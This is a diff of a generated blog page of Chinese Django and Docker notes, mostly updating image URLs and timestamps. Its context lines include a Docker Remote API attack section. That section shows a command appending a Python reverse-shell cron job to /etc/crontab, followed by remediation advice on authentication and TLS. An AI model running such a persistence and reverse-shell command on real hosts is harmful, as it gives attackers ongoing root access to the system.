@@ -27,8 +27,8 @@
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/b12bdb25ly1g0tg01pnn1j20du05ejrf.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/b12bdb25ly1g0tg0dwyarj20qr0ah3zu.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/b12bdb25ly1g0tg0t0z7vj20n40a3jt7.jpg">
-<meta property="og:image" content="0sec.com.cn/2019-01-26/1F2713CD8E5B4AF295BA6DC43C85432A">
-<meta property="og:updated_time" content="2019-03-07T08:14:31.060Z">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/b12bdb25ly1g0uaxo53abj20pf09e0v4.jpg">
+<meta property="og:updated_time" content="2019-03-07T08:20:31.566Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Django开发小记 &amp; Docker笔记">
 <meta name="twitter:description" content="本文中两者并没有关系，只是单独发略显单薄…">
@@ -320,7 +320,7 @@ $ docker container ls
 # 列出本机所有容器，包括终止运行的容器
 $ docker container ls --all
 
-</code></pre><p><img src="1F2713CD8E5B4AF295BA6DC43C85432A" alt="image"></p>
+</code></pre><p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1g0uaxo53abj20pf09e0v4.jpg" alt=""></p>
 <pre><code>
 # 终止运行
 $ docker container kill [containID]
@@ -369,7 +369,7 @@ cf03ee007fb4        host                host
 <pre><code>echo -e &quot;*/1 * * * * root /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;\n&quot; &gt;&gt; /etc/crontab
 </code></pre><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul>
 <li>尽量不启用Docker Remote API，若要启用则添加认证如ACL/TLS/Nginx基础认证；</li>
-<li>客户端连接时设置以下环境变量export DOCKER_TLS_VERIFY=1</li>
+<li>客户端连接时设置以下环境变量<code>export DOCKER_TLS_VERIFY=1</code></li>
 </ul>
 <pre><code>export DOCKER_CERT_PATH=~/.docker
 export DOCKER_HOST=tcp://10.10.10.10:2375
